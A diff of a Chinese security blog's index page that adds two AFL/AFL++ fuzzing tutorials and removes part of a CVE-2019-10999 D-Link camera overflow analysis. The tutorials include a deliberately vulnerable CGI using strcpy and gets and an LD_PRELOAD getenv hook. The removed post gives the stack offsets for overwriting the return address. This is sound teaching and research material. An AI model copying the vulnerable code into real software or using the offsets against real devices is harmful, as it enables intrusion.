@@ -168,6 +168,213 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[afl-training]%20quickstart/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/13/%5Bafl-training%5D%20quickstart/" class="post-title-link" itemprop="url">[afl-training] quickstart</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-13 10:05:10 / Modified: 10:26:52" itemprop="dateCreated datePublished" datetime="2023-04-13T10:05:10+08:00">2023-04-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="afl-training-quickstart"><a href="#afl-training-quickstart" class="headerlink" title="[afl-training] quickstart"></a>[afl-training] quickstart</h1><p>afl-trainning 是之前在安全客上发现的关于 AFL 实战的学习资料，之前一直想通过 AFL 来进行实战，苦于网上的都是一些基础的使用教程，发现这个资料的时候欣喜万分。</p>
+<p>在这个 AFL workshop 中，主要包含了以下的一些内容：</p>
+<ul>
+<li>quickstart：一个简单的例子，通过 afl 编译程序然后使用 afl-fuzz 来 fuzz，新手入门必看，也就是这一篇文章</li>
+<li>harness：</li>
+<li>challenges：几个使用 fuzz 可以挖掘出来的经典漏洞<ul>
+<li>libxml2：CVE-2015-8317</li>
+<li>heartbleed：openssl 的心脏滴血漏洞 CVE-2014-0160</li>
+<li>sendmail：CVE-1999-0206, CVE-2003-0161</li>
+<li>ntpq：CVE-2009-0159</li>
+<li>date：CVE-2017-7476</li>
+<li>cyber-grand-challenge</li>
+<li>sendmail&#x2F;1305</li>
+</ul>
+</li>
+</ul>
+<p>教程是可以使用 docker 的形式创建学习环境的，我这个地方就没有使用了，直接在 git 目录中进行学习。</p>
+<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>trainning 中使用的是 AFLplusplus，我此处使用的就是 AFL，因为之前在看 AFL 的源码。</p>
+<p>首先进入 quickstart 目录，然后使用 afl-clang 对程序源码进行编译</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd quickstart</span><br><span class="line">CC=afl-clang AFL_HARDEN=1 make</span><br></pre></td></tr></table></figure>
+
+<p>编译出来的程序是读取 STDIN 标准输入进行处理，可直接运行程序，如果敲下回车不输入数据会显示程序帮助信息，也可以直接从 inputs 提供的种子文件进行运行。</p>
+<p><img src="/images/image-2023-0413-100605033.png" alt="undifined"></p>
+<h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h2><p>使用如下的命令直接进行 fuzz，下图是 fuzz 出来的结果，运行了 44 分钟之后跑出了 9 个 crash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i inputs -o out ./vulnerable</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0413-100622630.png" alt="undifined"></p>
+<h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><ul>
+<li><p>AFL 是如何使用 afl-clang 进行插桩的？</p>
+<p>首先需要知道正常使用 gcc 进行编译和使用 alf-clang 进行编译，产生的可执行文件在二进制上的差别。安全相关，因此先使用 checksec 查看 afl-clang 编译出来的可执行文件开启了哪些防御措施，然后使用 gcc 开启对应的防御参数重新进行编译</p>
+</li>
+</ul>
+<p><img src="/images/image-2023-0413-100640530.png" alt="undifined"></p>
+<p>  那么使用 gcc 进行编译的命令如下，FORTIFY 选项没有编译出来</p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fstack-protector-all -z noexecstack -O2 -D_FORTIFY_SOURCE=1 -o vulnerable_gcc vulnerable.c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0413-100655331.png" alt="undifined"></p>
+<p>  然后使用 bindiff 工具进行查看，可以看到 afl-clang 编译出来的可执行文件中，在每一个基本块中，都加入了 afl_maybe_log 函数，通过在 AFL 源码目录中搜索该函数，可以定位到是在 afl-as.h 文件中，在源码中是以一串静态字符串形式存储的汇编代码，此处以 64 位为例，源码部分如下。</p>
+<p><img src="/images/image-2023-0413-100709554.png" alt="undifined"></p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>  将源代码编译成二进制文件的基本流程是：源代码 -&gt; 汇编代码 -&gt; 二进制代码，将汇编代码编译成二进制的工具就是汇编器 assembler。Linux 常用的汇编器是 as，当完成了 AFL 的编译后，在目录下也会存在一个 as 文件，并且作为符号链接指向 afl-as。因此，此处的代码插桩实现应该是使用的 afl-as，在将源代码编译成汇编代码的过程中，将如上的 afl_maybe_log 函数插入到分支处，也就是在基本块中进行插桩。如上的插桩代码就是 x64 下正常调用一个函数的流程：开辟栈空间，调用 afl_maybe_log 函数，执行完毕函数之后恢复栈平衡。afl_maybe_log 函数也就是插桩具体要执行的内容。此处不多分析 afl_maybe_log 函数的源码，函数位于 afl-as.c 中，就简单说一下函数的实现功能：通过共享内存对基本块的执行情况进行保存。</p>
+<p>  对于插桩分析得比较不错的可以参考看雪的这篇文章：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-265973.htm">[原创]AFL编译插桩部分源码分析</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/%E4%BD%BF%E7%94%A8afl%E5%AF%B9%E6%97%A0%E6%BA%90%E7%A0%81%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="ToT">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/13/%E4%BD%BF%E7%94%A8afl%E5%AF%B9%E6%97%A0%E6%BA%90%E7%A0%81%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">使用afl对无源码程序进行测试</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-13 10:01:10 / Modified: 10:03:06" itemprop="dateCreated datePublished" datetime="2023-04-13T10:01:10+08:00">2023-04-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="使用-afl-对无源码的程序进行-fuzz"><a href="#使用-afl-对无源码的程序进行-fuzz" class="headerlink" title="使用 afl 对无源码的程序进行 fuzz"></a>使用 afl 对无源码的程序进行 fuzz</h1><p>有源码的情况下，可以使用 afl 相关的编译器进行编译插桩，然后进行 fuzz；如果是无源码的情况下，就需要使用 afl 的 qemu mode 进行 fuzz。这个地方我使用的是 <a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">AFLPlusPlus</a>，之前已经大概看过 afl 的源码，afl++ 源码的结构更加清晰，因此后面都是在使用 afl++ 作为 fuzz 工具。</p>
+<h2 id="待-fuzz-程序和函数劫持-so"><a href="#待-fuzz-程序和函数劫持-so" class="headerlink" title="待 fuzz 程序和函数劫持 so"></a>待 fuzz 程序和函数劫持 so</h2><p>手上有的程序是 x64 的一个简易 cgi，源码如下，是从环境变量中读取数据存放在 buffer 中，当前的目标就是对其中的一个环境变量进行模糊测试，使用 hook 对 REQUEST_METHOD 赋予给定值 GET，然后对 QUERY_STRING 环境变量从标准输入中读取。具体的 hook 实现过程可以参考<a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/12/29/%E5%A6%82%E4%BD%95%E5%8A%AB%E6%8C%81%E4%B8%80%E4%B8%AAcgi%E7%9A%84getenv%E5%87%BD%E6%95%B0/">如何劫持一个 cgi 的 getenv 函数</a>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cgi_nolen.c</span></span><br><span class="line"><span class="comment">// gcc cgi_nolen.c -o cgi_nolen</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* method = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">    <span class="type">char</span>* url;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="keyword">if</span> (!method) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] no init env!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 两条路径：</span></span><br><span class="line">    <span class="comment">// GET-&gt;URL 两个环境变量导致的缓冲区溢出</span></span><br><span class="line">    <span class="comment">// POST-&gt;STDIN 一个环境变量+标准输入导致的缓冲区溢出</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(method, <span class="string">&quot;GET&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] this is get method\n&quot;</span>);</span><br><span class="line">        url = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] get query string %s\n&quot;</span>, url);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] copy url to buffer\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(buffer, url);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] buffer is %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(method, <span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] this is post method\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个地方存在缓冲区溢出</span></span><br><span class="line">        gets(buffer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] get stdin: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>hook 代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.c</span></span><br><span class="line"><span class="comment">// gcc -D_GUN_SOURCE -shared -fPIC -o hook_getenv.so hook.c -ldl</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE  <span class="comment">// 使用RELD_NEXT</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *(*original_getenv_func)(<span class="type">const</span> <span class="type">char</span> *) = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 定义全局变量buffer来存储STDIN中读取的数据</span></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">getenv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span> &#123;</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="comment">// 这个地方还需要考虑变异出来的数据的长度和大小</span></span><br><span class="line">  <span class="keyword">if</span> (!original_getenv_func) original_getenv_func = dlsym(RTLD_NEXT, <span class="string">&quot;getenv&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个地方需要定义一个缓冲区才行，用来从stdin中读取数据</span></span><br><span class="line">  <span class="type">char</span> *result = original_getenv_func(name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[hook] hook env %s, origin = %s\n&quot;</span>, name, result);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;REQUEST_METHOD&quot;</span>, <span class="number">14</span>)) &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(buffer, <span class="string">&quot;GET\0&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;GET\0&quot;</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[hook] changing to %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;QUERY_STRING&quot;</span>, <span class="number">12</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[hook] hook env URL,change to STDIN\n&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[hook] from STDIN %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="编译-qemu-mode"><a href="#编译-qemu-mode" class="headerlink" title="编译 qemu-mode"></a>编译 qemu-mode</h2><p>要使用 qemu-mode，首先要编译和待 fuzz 程序架构一致的 afl-qemu-trace。打开 qemu-mode 文件夹，准备编译。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CPU_TARGET=x86_64 ./build_qemu_support.sh</span><br><span class="line">cd ..</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<p>如果要 fuzz 其他架构的程序，那么对应把 CPU_TARGET 进行设定即可，例如 arm、i386 等等。</p>
+<h2 id="设置-QEMU-的-so-劫持"><a href="#设置-QEMU-的-so-劫持" class="headerlink" title="设置 QEMU 的 so 劫持"></a>设置 QEMU 的 so 劫持</h2><p>正常情况下如果要劫持一个程序的某些函数，使用环境变量 LD_PRELOAD 即可。afl 的 qemu mode 本质上也是使用的 qemu，如果要劫持待 fuzz 程序的函数，需要在启动 afl 的时候使用环境变量 QEMU_SET_ENV 设置程序在 QEMU 运行下的环境变量。那么 fuzz 的启动命令如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_SET_ENV=LD_PRELOAD=&quot;./hook_getenv.so&quot; REQUEST_METHOD=GET afl-fuzz -i input -o output -m none -Q ./cgi_nolen </span><br></pre></td></tr></table></figure>
+
+<p>可以对上面的启动命令做解释：</p>
+<ul>
+<li><code>QEMU_SET_ENV=LD_PRELOAD=&quot;./hook_getenv.so&quot;</code> 设置待 fuuz 程序的环境变量，设置劫持</li>
+<li><code>REQUEST_METHOD=GET</code> 相当于是将 afl-fuzz 和待 fuzz 程序的 REQUEST_METHOD 值都设置成了 POST，因为在 fuzz 的时候使用 fork 创建的子进程继承了 afl-fuzz 的环境变量。</li>
+<li><code>afl-fuzz -i input -o output -m none -Q ./cgi_nolen</code> 从 input 文件夹读取种子，fuzz 结果存放在 output 文件夹，无内存限制，使用 QEMU 模式。</li>
+</ul>
+<p>跑了 11 分钟，出来了 5000 多个 crash，其中的两个是 unique crash。</p>
+<p><img src="/images/image-2023-0413-100152606.png" alt="undifined"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1302,282 +1509,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2019-10999%20dlink%20ip%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="ToT">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/12/CVE-2019-10999%20dlink%20ip%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">CVE-2019-10999 dlink ip摄像头缓冲区溢出漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-04-12 06:46:43 / Modified: 18:53:51" itemprop="dateCreated datePublished" datetime="2023-04-12T06:46:43+08:00">2023-04-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>CVE-2019-10999 是 Dlink IP 摄像头的后端服务器程序 alphapd 中的一个缓冲区溢出漏洞，漏洞允许经过身份认证的用户在请求 wireless.htm 时，传入 WEPEncryption 参数一个长字符串来执行任意代码。具体描述以及受攻击的型号、固件版本可以查看参考链接，此处漏洞复现采用的是设备 dcs-932l 固件版本 1.14.04，固件下载链接查看参考链接。</p>
-<p>对后端服务器程序 alphapd 进行分析，存在漏洞的函数是 sub_435DEC，开辟的栈帧大小是 0x48，其中该函数的返回地址保存在 sp + 0x40，存在溢出的缓冲区起始地址是 sp + 0x18。因此，只需要向缓冲区写入超过 0x28 个字节就可以溢出覆盖返回地址，劫持控制流。除此之外还可以控制 S0~S5 寄存器。</p>
-<p>如下是 sub_435DEC 栈帧的开辟以及返回地址的存储汇编代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00435DEC li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)</span><br><span class="line">.text:00435DF4 addu    $gp, $t9</span><br><span class="line">.text:00435DF8 addiu   $sp, -0x48</span><br><span class="line">.text:00435DFC sw      $ra, 0x28+var_s18($sp)</span><br><span class="line">.text:00435E00 sw      $s5, 0x28+var_s14($sp)</span><br><span class="line">.text:00435E04 sw      $s4, 0x28+var_s10($sp)</span><br><span class="line">.text:00435E08 sw      $s3, 0x28+var_sC($sp)</span><br><span class="line">.text:00435E0C sw      $s2, 0x28+var_s8($sp)</span><br><span class="line">.text:00435E10 sw      $s1, 0x28+var_s4($sp)</span><br><span class="line">.text:00435E14 sw      $s0, 0x28+var_s0($sp)</span><br><span class="line">.text:00435E18 sw      $gp, 0x28+var_18($sp)</span><br></pre></td></tr></table></figure>
-
-<p>如下是调用 strcpy 函数复制数据到栈上的缓冲区中，strcpy 的第一个参数 des 通过 a0 寄存器传入，由于跳转延迟槽，对 a0 的操作指令在 jalr 指令之后，但是先于跳转指令执行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00435F98 loc_435F98:                              # CODE XREF: sub_435DEC+134↑j</span><br><span class="line">.text:00435F98 la      $t9, strcpy</span><br><span class="line">.text:00435F9C move    $a1, $s1</span><br><span class="line">.text:00435FA0 jalr    $t9 ; strcpy</span><br><span class="line">.text:00435FA4 addiu   $a0, $sp, 0x18</span><br><span class="line">.text:00435FA8 lw      $gp, 0x28+var_18($sp)</span><br><span class="line">.text:00435FAC b       loc_435E98</span><br><span class="line">.text:00435FB0 nop</span><br></pre></td></tr></table></figure>
-
-<p>如下是函数执行完毕进行堆栈平衡，以及恢复 S0~S5寄存器、恢复 ra 寄存器到函数返回地址并跳转执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:0004BF34 loc_4BF34:</span><br><span class="line">.text:0004BF34 				lw      $ra, 0x28+var_s14($sp)</span><br><span class="line">.text:0004BF38 				lw      $s4, 0x28+var_s10($sp)</span><br><span class="line">.text:0004BF3C 				lw      $s3, 0x28+var_sC($sp)</span><br><span class="line">.text:0004BF40 				lw      $s2, 0x28+var_s8($sp)</span><br><span class="line">.text:0004BF44 				lw      $s1, 0x28+var_s4($sp)</span><br><span class="line">.text:0004BF48 				lw      $s0, 0x28+var_s0($sp)</span><br><span class="line">.text:0004BF4C 				jr      $ra</span><br><span class="line">.text:0004BF50 				addiu   $sp, 0x40</span><br><span class="line">.text:0004BF50  # End of function system</span><br></pre></td></tr></table></figure>
-
